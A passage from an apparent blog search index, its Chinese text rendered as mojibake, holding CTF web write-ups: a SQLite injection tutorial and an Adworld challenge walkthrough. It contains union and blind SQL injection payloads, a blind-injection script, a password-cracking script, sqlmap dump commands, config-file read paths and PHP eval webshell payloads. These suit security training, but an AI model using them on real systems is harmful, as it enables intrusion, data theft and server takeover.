__gads=ID=f01d1993f76853c0-224634b7f6d100ca:T=1649937963:RT=1649937963:S=ALNI_MZ-hofC8jAB4S9yUeyX8RMp1LN2-gUpgrade-Insecure-Requests: 1Cache-Control: max-age=0Content-Length: 0Content-Length: 0 æ„é€ è¿™ä¸ªè¯·æ±‚è·å¾—flagã€‚ æ€»ç»“æ¯”èµ›é‡Œçš„é‚£é¢˜httpè¯·æ±‚èµ°ç§éš¾åº¦è¿˜æ˜¯æŒºå¤§çš„ï¼Œç­‰ä¹‹åå¯ä»¥å¤ç°ä¸€ä¸‹ï¼Œä¹Ÿäº†è§£ä¸€ä¸‹httpèµ°ç§åœ¨æ¯”èµ›ä¸­çš„åˆ©ç”¨æ–¹æ³•ï¼Œç†è®ºå†™èµ·æ¥è¿˜æ˜¯æ¯”è¾ƒç©ºæ³›çš„ï¼Œæœ€åä¸€å®šè¦è½åˆ°å®è·µä¸Šã€‚","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-http -web","slug":"http-web","permalink":"http://example.com/tags/http-web/"}]},{"title":"sqliteæ•°æ®åº“åŠæ³¨å…¥","slug":"sqliteæ•°æ®åº“åŠæ³¨å…¥","date":"2022-04-28T08:14:59.000Z","updated":"2022-04-28T11:45:14.563Z","comments":true,"path":"2022/04/28/sqliteæ•°æ®åº“åŠæ³¨å…¥/","link":"","permalink":"http://example.com/2022/04/28/sqlite%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8F%8A%E6%B3%A8%E5%85%A5/","excerpt":"å‰è¨€ æœ€è¿‘å®åœ¨æ˜¯å¿™éƒ½æ²¡æ—¶é—´å†™åšå®¢ï¼Œéš¾å¾—å‘¨å››é™¢ä¼‘èµ¶ç´§æŠŠä¹‹å‰æŒ–çš„sqliteçš„å‘ç»™å¡«äº†ã€‚","text":"å‰è¨€ æœ€è¿‘å®åœ¨æ˜¯å¿™éƒ½æ²¡æ—¶é—´å†™åšå®¢ï¼Œéš¾å¾—å‘¨å››é™¢ä¼‘èµ¶ç´§æŠŠä¹‹å‰æŒ–çš„sqliteçš„å‘ç»™å¡«äº†ã€‚ sqliteä¸mysqlçš„ä¸åŒ Sqliteæ•°æ®åº“çš„ç‰¹ç‚¹æ˜¯å®ƒæ¯ä¸€ä¸ªæ•°æ®åº“éƒ½æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œå½“ä½ æŸ¥è¯¢è¡¨çš„å®Œæ•´ä¿¡æ¯æ—¶ä¼šå¾—åˆ°åˆ›å»ºè¡¨çš„è¯­å¥ã€‚æ‰€ä»¥mysqlç›²æ³¨è¿˜æ˜¯æ¯”è¾ƒèŠ±æ—¶é—´çš„ï¼Œå› ä¸ºä¼šæŸ¥å‡ºå®Œæ•´è¯­å¥ã€‚ sqliteæ•°æ®åº“æœ‰ä¸€å¼ sqlite_masterè¡¨ï¼Œé‡Œé¢æœ‰type/name/tbl_name/rootpage/sqlè®°å½•ç€ç”¨æˆ·åˆ›å»ºè¡¨æ—¶çš„ç›¸å…³ä¿¡æ¯ï¼ŒæŸ¥è¯¢çš„åˆ©ç”¨æ ¸å¿ƒä¾¿æ˜¯è¿™ä¸ªè¡¨äº†ã€‚ sqliteæ•°æ®åº“çš„æ³¨é‡Šç¬¦æ˜¯--ï¼Œè€Œå¹¶éæ˜¯mysqlçš„#æˆ–è€…--+ï¼Œsqliteä¸­çš„ç©ºæ ¼ä¼šè‡ªåŠ¨ç”¨åŠ å·è¡¨ç¤ºã€‚ sqliteçš„å¢åˆ æŸ¥æ”¹æ–°å»ºè¡¨ï¼š 1create table test01(id int,name varchar(255)); æ’å…¥æ•°æ®ï¼š 1insert into test01 (id,name) values (1,&#x27;mrl64&#x27;); æ’å…¥å­—æ®µï¼š 1alter table test01 add column passwd varchar(255); æŸ¥è¯¢æ•°æ®ï¼š 12select name from test01 where id=1;//mrl64 æ›´æ”¹æ•°æ®ï¼š 1Update teat01 set name=â€™strlâ€™ where id=1; åˆ åº“è·‘è·¯ï¼ˆbushiï¼š 1drop table test01; è¦æ³¨æ„ï¼Œsqliteä¸èƒ½ç›´æ¥æ›´æ”¹å­—æ®µç±»å‹ï¼Œå¦‚æœè¦æ›´æ”¹åªèƒ½é‡æ–°åˆ›å»ºè¡¨æ ¼å¹¶è¿›è¡Œæ•°æ®è¿ç§»ã€‚ sqliteæ³¨å…¥sqliteå’Œmysqlè™½ç„¶å­˜åœ¨çš„ä¸€äº›ç»†å¾®å·®åˆ«ï¼Œä¸è¿‡åœ¨æ³¨å…¥æ–¹æ³•ä¸Šè¿˜æ˜¯å¤§ä½“ç›¸è¿‘çš„ã€‚ è”åˆæ³¨å…¥ç”±äºsqliteçš„æ€§è´¨å†³å®šäº†æˆ‘ä»¬ä¸éœ€è¦æŸ¥åº“æƒ³ï¼Œè”åˆæŸ¥è¯¢åŒæ ·ä¹Ÿæ˜¯order by é…åˆunion selectä¸€å¥—ç»„åˆæ‹³ä¸‹æ¥ï¼Œä¸‹é¢å°±æ”¾ä¸€ä¸‹å¤§æ¦‚çš„æµç¨‹å§ï¼š 123456789?id=1 order by 3 //order byç¡®å®šå­—æ®µæ•°?id=0 union select 1,2,group_concat(name) from sqlite_master //æŸ¥è¡¨?id=0 union select 1,2,group_concat(sql) from sqlite_master //æŸ¥å­—æ®µ?id=0 union select 1,2,group_concat(flag) from flag //æŸ¥æ•°æ®å½“ç„¶ä¹Ÿæ¨èä½¿ç”¨limitè¿›è¡Œé€æ¡æ‰“å° å¸ƒå°”ç›²æ³¨è¿™é‡Œå’Œmysqlæœ€å¤§çš„å·®åˆ«åœ¨äºsqliteæ²¡æœ‰ascii()å‡½æ•°ï¼Œå› æ­¤åªèƒ½ä½¿ç”¨å­—å…¸çˆ†ç ´çš„æ–¹å¼è¿›è¡Œç›²æ³¨ï¼Œä¸è¿‡sqliteæ˜¯åŒºåˆ†å¤§å°å†™çš„ï¼Œå› æ­¤å¯ä»¥é¿å…mysqlç›²æ³¨æ—¶ä¸ç¡®å®šå¤§å°å†™çš„å°´å°¬ã€‚ æ²¡æœ‰å¾ˆå¼ºçš„wafçš„è¯ç›´æ¥ç”¨sqlmapä¹Ÿæ˜¯å¯ä»¥è·‘çš„ï¼Œè¿™é‡Œè´´ä¸€ä¸ªä¹‹å‰åšé¢˜çš„è„šæœ¬ï¼š 123456789101112131415161718192021222324252627import requestsimport stringstrs = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@_.,-&#123;&#125; &quot;url = &quot;http://1.14.71.254:28467/query&quot;s = requests.session()headers = &#123;&#x27;Cookie&#x27;: &#x27;session=eyJyb2xlIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.YklOVg.Pz554uNEiaxxBCpP4pm7-G8iucg&#x27;&#125;if __name__ == &quot;__main__&quot;: name = &#x27;&#x27; for i in range(0,100): char = &#x27;&#x27; for j in strs: #è¡¨+å­—æ®µ #payload = &quot;1 and substr((select sql from sqlite_master limit 1,1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;.format(i, j) #æ•°æ® payload = &quot;1 and substr((select flag from flag limit 0,1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;.format(i, j) data = &#123;&quot;id&quot;: payload&#125; r = s.post(url=url, data=data, headers=headers) #print(r.text) if &quot;exist&quot; in r.text: name += j print(j, end=&#x27;&#x27;) char = j break if char == &#x27;%&#x27;: break æ—¶é—´ç›²æ³¨sqliteæ²¡æœ‰sleep()å‡½æ•°ï¼Œæˆ‘ä»¬å°±ç”¨ä¸‹ä½æ›¿ä»£randomblob()å‡½æ•°æ¥ä»£æ›¿ï¼Œè¿™ä¸ªå‡½æ•°å¯ä»¥ç”Ÿæˆä¸€ä¸ªNå­—èŠ‚çš„blobï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªå‡½æ•°æ¥è¾¾åˆ°å»¶è¿Ÿçš„æ•ˆæœã€‚ randomblob(): The randomblob(N) function return an N-byte blob containing pseudo-random bytes. If N is less than 1 then a 1-byte random blob is returned. Hint: applications can generate globally unique identifiers using this function together with hex() and/or lower() like this:hex(randomblob(16)) æˆ‘ä»¬çš„æŸ¥è¯¢è¯­å¥æ„é€ æ–¹æ³•ï¼š 1and 1=(case when(substr(sqlite_version(),1,1)=&#x27;3&#x27;) then randomblob(1000000000) else 0 end) case when()çš„ç”¨æ³•å°±ç›¸å½“äºä¸‰ç›®è¿ç®—ç¬¦é‚£æ ·ï¼Œæ³¨å…¥çš„æ—¶å€™é€‚å½“æ›´æ”¹payloadå°±å¯ä»¥äº†ã€‚ æ„é€ webshellç”¨sqliteæ„å»ºwebshellè¿™ä¸ªå§¿åŠ¿è¿˜æ˜¯æ¯”è¾ƒæœ‰æ„æ€çš„ï¼Œç”¨åˆ°äº†sqliteçš„é™„åŠ æ•°æ®åº“â€”â€”ATTACHè¯­å¥æ¥è¿›è¡Œæ„é€ ã€‚ ATTACH: 12345ATTACH DATABASE file_name AS database_name;å¦‚æœæ•°æ®åº“å°šæœªè¢«åˆ›å»ºï¼Œä¸Šé¢çš„å‘½ä»¤å°†åˆ›å»ºä¸€ä¸ªæ•°æ®åº“ï¼Œå¦‚æœæ•°æ®åº“å·²å­˜åœ¨ï¼Œåˆ™æŠŠæ•°æ®åº“æ–‡ä»¶åç§°ä¸é€»è¾‘æ•°æ®åº“&#x27;Alias-Name&#x27;ç»‘å®šåœ¨ä¸€èµ·ã€‚æ‰“å¼€çš„æ•°æ®åº“å’Œä½¿ç”¨ATTACHé™„åŠ è¿›æ¥çš„æ•°æ®åº“çš„å¿…é¡»ä½äºåŒä¸€æ–‡ä»¶å¤¹ä¸‹ã€‚ æˆ‘ä»¬é€šè¿‡å»å»ºç«‹ä¸€ä¸ªæ–‡ä»¶ï¼Œå†æ’å…¥payloadçš„æ–¹å¼æ„å»ºwebshellã€‚ æ„é€ è¿‡ç¨‹ï¼š 123ATTACH DATABASE &#x27;/home/shell.php&#x27; AS shell; //åˆ›å»ºæ–‡ä»¶create TABLE shell.exp (payload text); //åˆ›å»ºè¡¨æ ¼ï¼Œä¸ºæ’å…¥è¯­å¥åšå‡†å¤‡insert INTO shell.exp (payload) VALUES (&#x27;&lt;?php @eval($_POST[1]); ?&gt;&#x27;); //æ’å…¥æ•°æ® æ€»ç»“sqliteè¿˜æ˜¯å¾ˆæœ‰æ„æ€çš„ä¸€å—å†…å®¹ï¼Œé™¤äº†SQLite votingé‚£é¢˜ä»¥å¤–æš‚æ—¶è¿˜æ²¡æœ‰çœ‹åˆ°éš¾åº¦è¾ƒé«˜çš„sqliteé¢˜ï¼Œè¿™å—çš„çŸ¥è¯†æ„Ÿè§‰åœ¨ä¹‹åä¹Ÿæ˜¯ä¸€ä¸ªè¶‹åŠ¿å§ã€‚","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -sqlite","slug":"web-sqlite","permalink":"http://example.com/tags/web-sqlite/"}]},{"title":"æ”»é˜²ä¸–ç•Œ3","slug":"æ”»é˜²ä¸–ç•Œ3","date":"2022-04-19T12:59:13.000Z","updated":"2022-04-21T14:20:19.148Z","comments":true,"path":"2022/04/19/æ”»é˜²ä¸–ç•Œ3/","link":"","permalink":"http://example.com/2022/04/19/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C3/","excerpt":"å‰è¨€ ç»§ç»­æ»šå›æ¥åˆ·æ”»é˜²ä¸–ç•Œäº†ã€‚","text":"å‰è¨€ ç»§ç»­æ»šå›æ¥åˆ·æ”»é˜²ä¸–ç•Œäº†ã€‚ Catè¿™é¢˜è€ƒçš„ç‚¹å®Œç¾è¸©åœ¨æˆ‘çš„é—å¿˜ç‚¹ä¸Šï¼Œèµ¶ç´§è®°ä¸€æ³¢ã€‚é¦–å…ˆè¿›å…¥ç½‘é¡µæ˜¯ä¸€ä¸ªæ¯”è¾ƒç†Ÿæ‚‰çš„pingåŠŸèƒ½ï¼ŒçŒœæµ‹rceï¼Œä½†æ˜¯å‘ç°æœ‰wafï¼Œå¯¹rceå‘½ä»¤è¿›è¡Œfuzzå‘ç°å®Œå…¨æ— æ³•æ‰§è¡Œï¼Œå› æ­¤è€ƒç‚¹ä¸æ˜¯rceã€‚ æ–‡ä»¶ç©¿æ¢­ä¹Ÿä¸å¯¹ï¼Œssrfä¹Ÿä¸å¯¹ï¼Œå› æ­¤è¿™é¢˜ä¸Šæ¥å°±å¡ä½äº†ã€‚æ±‚åŠ©ä¸‡èƒ½çš„wpï¼Œé¦–å…ˆæˆ‘ä»¬åœ¨urlå‚æ•°ä¸­ä¼ å…¥%80æˆ–è€…ä»¥åçš„asciiå­—ç¬¦ï¼Œå¯ä»¥å¾—åˆ°DjangoæŠ¥é”™é¡µé¢çš„htmlç ï¼Œç»“åˆæŠ¥é”™åŸå› åº”è¯¥æ˜¯å› ä¸ºasciiç¼–ç ä¸æ”¯æŒå¯¼è‡´çš„ã€‚ è¿™é‡Œå°±è¦æƒ³åˆ°åœ¨phpä¸­å¯ä»¥åˆ©ç”¨@è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–ï¼Œæ¯”å¦‚è¯»å–index.php: 1?url=@index.php æ—¢ç„¶å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–é‚£å°±ç®€å•äº†ï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘çŒœæµ‹flagä½ç½®æˆ–è€…æŸ¥çœ‹é…ç½®æ–‡ä»¶ï¼Œè¿™ç§é¢˜æ ¹ç›®å½•å’Œç½‘é¡µæ ¹ç›®å½•æ²¡æœ‰flagçš„è¯å¤šåŠå¾—å»é…ç½®æ–‡ä»¶æ‰¾ï¼Œé‚£ä¹ˆè¿™é¢˜è¦æ‰¾pythonçš„é…ç½®æ–‡ä»¶ï¼š 1?url=@/opt/api/api/settings.py è·å–æ•°æ®åº“ådatabase.sqlite3ï¼Œè¯»å–æ•°æ®åº“å†…å®¹å³å¯æ‰¾åˆ°flagï¼š 1?url=@/opt/api/database.sqlite3 FlatScienceä¹Ÿæ˜¯ç›¸å½“æœ‰éš¾åº¦çš„ä¸€é¢˜ï¼Œé¦–å…ˆè¿›å»å¥½åƒåªæœ‰å‡ ä¸ªpdfæ–‡ä»¶èƒ½ä¸‹è½½ï¼Œå¹²ä¸äº†å•¥åˆ«çš„äº‹ï¼Œé‚£ä¹ˆå¸¸è§„ä¿¡æ¯æœé›†ä¸€ä¸‹ï¼Œå‘ç°robots.txtï¼Œéšè—äº†login.phpå’Œadmin.phpï¼Œä¾æ¬¡æŸ¥çœ‹ã€‚ admin.phpä¸­æºç ç›´æ¥å†™é“ä¸å¯èƒ½bypassï¼Œfuzzäº†ä¸‹å‘ç°ç¡®å®bypassä¸äº†ï¼Œé‚£ä¹ˆæŠŠç›®å…‰æ”¾åœ¨login.phpä¸Šã€‚æŸ¥çœ‹æºç å‘ç°è®©æˆ‘ä»¬GETä¸€ä¸ªdebugå‚æ•°è¿›å»ï¼Œä¼ å…¥åå‘ç°åç«¯æºç ï¼š 1234567891011121314151617181920212223242526&lt;?phpif(isset($_POST[&#x27;usr&#x27;]) &amp;&amp; isset($_POST[&#x27;pw&#x27;]))&#123; $user = $_POST[&#x27;usr&#x27;]; $pass = $_POST[&#x27;pw&#x27;]; $db = new SQLite3(&#x27;../fancy.db&#x27;); $res = $db-&gt;query(&quot;SELECT id,name from Users where name=&#x27;&quot;.$user.&quot;&#x27; and password=&#x27;&quot;.sha1($pass.&quot;Salz!&quot;).&quot;&#x27;&quot;); if($res)&#123; $row = $res-&gt;fetchArray(); &#125; else&#123; echo &quot;&lt;br&gt;Some Error occourred!&quot;; &#125; if(isset($row[&#x27;id&#x27;]))&#123; setcookie(&#x27;name&#x27;,&#x27; &#x27;.$row[&#x27;name&#x27;], time() + 60, &#x27;/&#x27;); header(&quot;Location: /&quot;); die(); &#125;&#125;if(isset($_GET[&#x27;debug&#x27;]))highlight_file(&#x27;login.php&#x27;);?&gt; é”å®šæ³¨å…¥ç‚¹ä¸ºusrå‚æ•°ï¼Œæ•°æ®åº“ç±»å‹ä¸ºsqliteï¼Œè¯•äº†ä¸‹æ²¡åŠ wafï¼Œé‚£ç›´æ¥sqlmapä¸€æŠŠå—¦ï¼š 1python2 sqlmap.py -r 1.txt --risk 3 --level 5 --dump-all --batch å†æŒ–ä¸ªå‘ï¼Œä¹‹åå†™ç¯‡å…³äºsqliteçš„åšå®¢å§ï¼Œç»“æœï¼š æˆ‘ä»¬å‘ç°äº†adminçš„å¯†ç ï¼Œä½†æ˜¯è¿™æ—¶åŠ å¯†è¿‡çš„ï¼Œæºç ä¹Ÿå‘Šè¯‰æˆ‘ä»¬åŠ å¯†é€»è¾‘æ˜¯sha1($password.&quot;Salz!&quot;)ï¼Œè€Œæ ¹æ®hintçš„å†…å®¹ï¼Œä¼°è®¡å¯†ç å°±å­˜åœ¨è®ºæ–‡ä¸­ï¼Œé‚£æˆ‘ä»¬å°±æŠŠè®ºæ–‡ä¸­çš„æ¯ä¸€ä¸ªè¯éƒ½è¯•ä¸€éï¼Œç®€å•æ¥è¯´å°±æ˜¯çˆ†ç ´ï¼ˆï¼Œè¿™ä¸ªexpçœŸçš„ä¸ä¼šå†™ï¼Œæ‰’ä¸€ä¸ªå§ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145import requestsfrom bs4 import BeautifulSoupimport osimport reimport hashlibfrom pdfminer.pdfparser import PDFParserfrom pdfminer.pdfdocument import PDFDocumentfrom pdfminer.pdfpage import PDFPagefrom pdfminer.pdfpage import PDFTextExtractionNotAllowedfrom pdfminer.pdfinterp import PDFResourceManagerfrom pdfminer.pdfinterp import PDFPageInterpreterfrom pdfminer.layout import *from pdfminer.converter import PDFPageAggregator# å°†pdfè½¬æ¢ä¸ºtxtçš„å‡½æ•°def pdf2txt(path): # æ‰“å¼€PDFæ–‡ä»¶ pdfFile = open(path, &#x27;rb&#x27;) # åˆ›å»ºpdfæ–‡æ¡£åˆ†æå™¨ parser = PDFParser(pdfFile) # åˆ›å»ºPDFæ–‡æ¡£å¯¹è±¡å­˜å‚¨æ–‡æ¡£ç»“æ„ document = PDFDocument(parser) # æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å…è®¸æ–‡æœ¬æå– if not document.is_extractable: raise PDFTextExtractionNotAllowed # åˆ›å»ºPDFèµ„æºç®¡ç†å™¨å¯¹è±¡æ¥å­˜å‚¨å…±äº«èµ„æº resource = PDFResourceManager() # è®¾å®šå‚æ•°è¿›è¡Œåˆ†æ laparams = LAParams() # åˆ›å»ºä¸€ä¸ªPDFè®¾å¤‡å¯¹è±¡ device = PDFPageAggregator(resource, laparams=laparams) # åˆ›å»ºä¸€ä¸ªPDFè§£é‡Šå™¨å¯¹è±¡ interpreter = PDFPageInterpreter(resource,device) # åˆ›å»ºå­˜å‚¨è½¬æ¢ç»“æœçš„åŒåtxtæ–‡ä»¶ fileName = str(path.split(&quot;.&quot;)[0]) newFileName = fileName + &quot;.txt&quot; f = open(newFileName, &quot;w&quot;) # å¤„ç†æ¯ä¸€é¡µ for page in PDFPage.create_pages(document): interpreter.process_page(page) # æ¥å—è¯¥é¡µé¢çš„LTPageå¯¹è±¡ layout = device.get_result() for x in layout: if (isinstance(x, LTTextBoxHorizontal)): # å†™å…¥txtæ–‡ä»¶ try: f.writelines(x.get_text() + &quot;\\n&quot;) except: pass f.close()# ä¸‹è½½æ‰€æœ‰pdfæ–‡ä»¶çš„å‡½æ•°def downloadpdf(): pdfUrl = [] # å­˜æ”¾æ‰€æœ‰pdfæ–‡ä»¶çš„è¿æ¥ # çˆ¬å–æ‰€æœ‰çš„pdfæ–‡ä»¶çš„è¿æ¥ urlList = [ &quot;http://111.200.241.244:49530/&quot;, &quot;http://111.200.241.244:49530/1/index.html&quot;, &quot;http://111.200.241.244:49530/1/2/index.html&quot;, &quot;http://111.200.241.244:49530/1/2/4/index.html&quot;, &quot;http://111.200.241.244:49530/1/2/5/index.html&quot;, &quot;http://111.200.241.244:49530/1/3/index.html&quot;, &quot;http://111.200.241.244:49530/1/3/6/index.html&quot;, &quot;http://111.200.241.244:49530/1/3/7/index.html&quot;, &quot;http://111.200.241.244:49530/1/3/7/8/index.html&quot; ] for each in urlList: r = requests.get(url=each) soup = BeautifulSoup(r.text, &#x27;lxml&#x27;) result = soup.find_all(name=&quot;a&quot;, attrs=&#123;&quot;title&quot;:&quot;my very fav paper&quot;&#125;) for tmp in result: if tmp[&quot;href&quot;].endswith(&quot;.pdf&quot;): pdfUrl.append(each.split(&quot;index.html&quot;)[0] + tmp[&quot;href&quot;]) # ä½¿ç”¨curl -O å‘½ä»¤ä¸‹è½½pdfæ–‡ä»¶ for each in pdfUrl: os.system(&quot;curl -O &quot; + each)# å–hashå€¼çš„å‡½æ•°def sha1(msg): sha1 = hashlib.sha1() sha1.update((msg + &quot;Salz!&quot;).encode(&quot;utf-8&quot;)) return sha1.hexdigest()# ç ´è§£å¯†ç çš„å‡½æ•°def getpassword(): passlist = &#123; &quot;3fab54a50e770d830c0416df817567662a9dc85c&quot;:&quot;admin&quot;, &quot;54eae8935c90f467427f05e4ece82cf569f89507&quot;:&quot;fritze&quot;, &quot;34b0bb7c304949f9ff2fc101eef0f048be10d3bd&quot;:&quot;hansi&quot; &#125; for each in os.listdir(os.curdir): # å–å‡ºtxtæ–‡ä»¶ if each.endswith(&quot;.txt&quot;): with open(each, &quot;r&quot;) as file: a = file.read() b = re.split(r&quot;[\\s\\,\\;\\.]+&quot;, a) # å°†å•è¯åˆ†å‰²å‡ºæ¥ c = [] tmp = &quot;&quot; judge = False # å¤„ç†ä»¥-ç»“å°¾çš„è¡Œï¼Œæœ€ç»ˆçš„ç»“æœä¿å­˜åœ¨cä¸­ for each in b: if each.endswith(&quot;-&quot;): tmp = each.split(&quot;-&quot;)[0] judge = True elif judge: c.append(tmp + each) judge = False else: c.append(each) # éå†cç¢°æ’å¾—åˆ°å¯†ç  for each in c: print(each) if sha1(each) in passlist: return &quot;----&quot; + passlist[sha1(each)] + &quot;&#x27;s password is &quot; + each + &quot;Salz!&quot; + &quot;----&quot;def main(): os.chdir(os.curdir + os.sep + &quot;pdfdir&quot;) # ä¿®æ”¹å·¥ä½œç›®å½• downloadpdf() # ä¸‹è½½pdfæ–‡ä»¶ # å°†æ‰€æœ‰pdfæ–‡ä»¶è½¬æ¢æˆtxtæ–‡ä»¶ for each in os.listdir(os.curdir): pdf2txt(each) # éå†æ‰€æœ‰çš„txtæ–‡ä»¶å¾—åˆ°å¯†ç  password = getpassword() return passwordif __name__ == &quot;__main__&quot;: print(main()) è·‘å‡ºæ¥å¯†ç ä¸ºThinJerboaï¼Œç™»å½•è·å¾—flagã€‚ ics-07å°åšä¸€æ‰‹å·¥æ§ï¼Œè¿™æ¬¡çš„è€ƒç‚¹åœ¨é¡¹ç›®ç®¡ç†ä¸€æ ä¸­ã€‚è¿›å…¥ç½‘é¡µå®¡æŸ¥å…ƒç´ å‘ç°å­˜åœ¨view-source.phpï¼Œè®¿é—®ä¸€æ³¢ï¼Œå®¡è®¡ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?php session_start(); if (!isset($_GET[page])) &#123; show_source(__FILE__); die(); &#125; if (isset($_GET[page]) &amp;&amp; $_GET[page] != &#x27;index.php&#x27;) &#123; include(&#x27;flag.php&#x27;); &#125;else &#123; header(&#x27;Location: ?page=flag.php&#x27;); &#125; ?&gt; &lt;?php if ($_SESSION[&#x27;admin&#x27;]) &#123; $con = $_POST[&#x27;con&#x27;]; $file = $_POST[&#x27;file&#x27;]; $filename = &quot;backup/&quot;.$file; if(preg_match(&#x27;/.+\\.ph(p[3457]?|t|tml)$/i&#x27;, $filename))&#123; die(&quot;Bad file extension&quot;); &#125;else&#123; chdir(&#x27;uploaded&#x27;); $f = fopen($filename, &#x27;w&#x27;); fwrite($f, $con); fclose($f); &#125; &#125; ?&gt; &lt;?php if (isset($_GET[id]) &amp;&amp; floatval($_GET[id]) !== &#x27;1&#x27; &amp;&amp; substr($_GET[id], -1) === &#x27;9&#x27;) &#123; include &#x27;config.php&#x27;; $id = mysql_real_escape_string($_GET[id]); $sql=&quot;select * from cetc007.user where id=&#x27;$id&#x27;&quot;; $result = mysql_query($sql); $result = mysql_fetch_object($result); &#125; else &#123; $result = False; die(); &#125; if(!$result)die(&quot;&lt;br &gt;something wae wrong ! &lt;br&gt;&quot;); if($result)&#123; echo &quot;id: &quot;.$result-&gt;id.&quot;&lt;/br&gt;&quot;; echo &quot;name:&quot;.$result-&gt;user.&quot;&lt;/br&gt;&quot;; $_SESSION[&#x27;admin&#x27;] = True; &#125; ?&gt; ä¸‰æ®µä»£ç ï¼Œç¬¬ä¸€æ®µä»£ç çš„æ„æ€æ˜¯å¦‚æœpageçš„å€¼ä¸ä¸ºç©ºä¸”pageä¸ä¸ºindex.phpï¼Œå°±ä¼šåŒ…å«flag.phpï¼Œå¦åˆ™å°±ä¼šç›´æ¥é‡å®šå‘pageä¸ºflag.phpã€‚ ç¬¬äºŒæ®µä»£ç æ˜¯æ–‡ä»¶å†™å…¥ï¼Œä½†æ˜¯å­˜åœ¨wafï¼Œå¹¶ä¸”è¦æ±‚$_SESSION[â€˜adminâ€™]ä¸ºtrueï¼Œåˆ™æ®µä»£ç åº”è¯¥æ˜¯æœ€åæ¥çœ‹çš„ã€‚ ç¬¬ä¸‰æ®µä»£ç æ€»çš„æ¥è¯´å°±æ˜¯è¦GETä¸€ä¸ªidå‚æ•°ï¼Œè¿™ä¸ªå‚æ•°çš„æµ®ç‚¹æ•°ä¸èƒ½ä¸º1ï¼Œä¸”idçš„æœ€åä¸€ä½å¿…é¡»å¾—æ˜¯9ï¼Œè¿™æ ·æ‰èƒ½è¿›è¡ŒsqlæŸ¥è¯¢ã€‚ç‰¹åˆ«è¦æ³¨æ„ï¼Œåœ¨æµ®ç‚¹æ•°é‚£é‡Œçš„æ¯”è¾ƒä¸­ç”¨çš„æ˜¯å¼ºç±»å‹æ¯”è¾ƒï¼Œå› æ­¤ä¸èƒ½ç”¨æ•°å­—ç»•ã€‚ æˆ‘ä»¬é’ˆå¯¹ç¬¬ä¸‰æ®µä»£ç å…ˆæ„å»ºpayloadï¼š 1?page=flag.php&amp;id=1a9 å¯ä»¥çœ‹åˆ°é¡µé¢ä¸Šå‡ºç°äº†name:adminï¼Œå› æ­¤æˆ‘ä»¬çš„sessionè¢«ç½®ä¸ºäº†trueï¼Œæ¥ä¸‹æ¥å°±æ˜¯å†™æ–‡ä»¶çš„éƒ¨åˆ†äº†ã€‚ è¿™é‡Œçš„wafä¸»è¦æ˜¯ç¦ç”¨äº†æ–‡ä»¶åç¼€ï¼Œåç¼€ä¸èƒ½ä¸ºphp``php3/4/5/7``pht``phtmlï¼Œå¦‚æœæ²¡æœ‰æ£€æµ‹åˆ°ï¼Œåˆ™æŠŠæ–‡ä»¶å†™å…¥å¹¶ä¿å­˜åœ¨/uploaded/backup/filenameä¸­ã€‚ é‚£ä¹ˆè¿™é‡Œè¦ç”¨åˆ°ä¸€ä¸ªå¾ˆç»å…¸çš„apacheæ–‡ä»¶è§£ææ¼æ´ï¼Œapacheè§£ææ–‡ä»¶æ—¶ä»æœ€å³è¾¹å¼€å§‹è§£æï¼Œå¦‚æœä¸æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„åç¼€åˆ™ä¼šå‘å·¦ç»§ç»­åŒ¹é…ï¼Œå¦‚æœæˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªshell.php.xxxæ–‡ä»¶çš„è¯ï¼Œapacheå°±ä¼šæŠŠå®ƒè§£ææˆshell.phpæ–‡ä»¶ã€‚ ä½†æ˜¯å°è¯•getshellå‘ç°å¤±è´¥äº†ï¼ŒçŒœæµ‹æ˜¯æˆ‘ä»¬åœ¨è¿™ä¸ªæ–‡ä»¶å¤¹ä¸­æ²¡æœ‰æ“ä½œæƒé™ï¼Œå› æ­¤æˆ‘ä»¬æŠŠphpæ–‡ä»¶å†™å…¥çˆ¶ç›®å½•ä¸­ï¼š 1con=&lt;?php @eval($_POST[&#x27;mrl64&#x27;]);?&gt;&amp;file=../shell.php/. å› æ­¤æ–‡ä»¶å†™åœ¨äº†/uploadedä¸­ï¼Œè®¿é—®å³å¯getshellï¼Œflagåœ¨ç½‘é¡µç›®å½•ä¸‹ã€‚ bugè¿›å…¥ç½‘é¡µå‘Šè¯‰æˆ‘ä»¬è¦ç™»å½•ï¼Œç„¶åè·³è½¬åˆ°ç™»å½•é¡µé¢ï¼Œå¯ä»¥æ³¨å†Œå’Œæ‰¾å›å¯†ç ï¼Œfuzzå‘ç°ä¸å­˜åœ¨sqlæ³¨å…¥ï¼Œé‚£ä¹ˆæ³¨å†Œç™»å½•è¿›è¡ŒæŸ¥çœ‹ã€‚ ç™»é™†æˆåŠŸåå‘ç°ç†Ÿæ‚‰çš„ç¬‘è„¸ï¼šï¼‰ï¼Œç‚¹å‡»å¯é€‰èœå•å‘ç°Manageéœ€è¦æ˜¯adminæ‰èƒ½ä½¿ç”¨ã€‚çŒœæµ‹åœ¨å¿˜è®°å¯†ç éƒ¨åˆ†å­˜åœ¨é€»è¾‘æ¼æ´ï¼Œå› æ­¤å°è¯•æ”¹å¯†ï¼Œç”¨è‡ªå·±çš„ä¿¡æ¯ç»•è¿‡å¯†ä¿ï¼Œæ¥ç€åœ¨step1è¾“å…¥æ–°å¯†ç 